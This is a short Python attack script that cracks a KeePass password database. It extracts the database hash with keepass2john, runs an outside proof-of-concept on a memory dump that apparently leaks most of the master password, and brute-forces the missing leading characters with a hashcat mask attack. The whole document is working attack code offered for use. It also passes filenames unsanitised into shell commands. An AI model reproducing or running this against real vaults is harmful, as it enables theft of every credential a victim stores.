import subprocess, sys, time

def extract_hash(kdbx_file):
  cmd = f"keepass2john {kdbx_file} > hash.txt"

  subprocess.Popen(cmd, shell=True)
  time.sleep(1)
  
  with open("hash.txt", "r") as hashfile:
    hash = hashfile.read()
    hash = hash[hash.index(":")+1:]
    
  with open("hash.txt", "w") as hashfile:
    hashfile.write(hash)
  return hash

def get_masterpassword(dmp_file, poc_file):
  process = subprocess.Popen(['python', poc_file, dmp_file], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
  stdout, stderr = process.communicate()
  output = stdout.decode()
  pwd = output.split("\n")[0]
  return pwd[pwd.index("●")+2:]
  
def crack_hash(kdbx_file, dmp_file, poc_file):
  extract_hash(kdbx_file)
  pwd = get_masterpassword(dmp_file, poc_file)
  cmd = f"hashcat -a 3 -m 13400 hash.txt ?a?a{pwd}"
  subprocess.Popen(cmd, shell=True)

if __name__ == "__main__":
  kdbx_file = sys.argv[1]
  dmp_file = sys.argv[2]
  poc_file = sys.argv[3]
  
  crack_hash(kdbx_file, dmp_file, poc_file)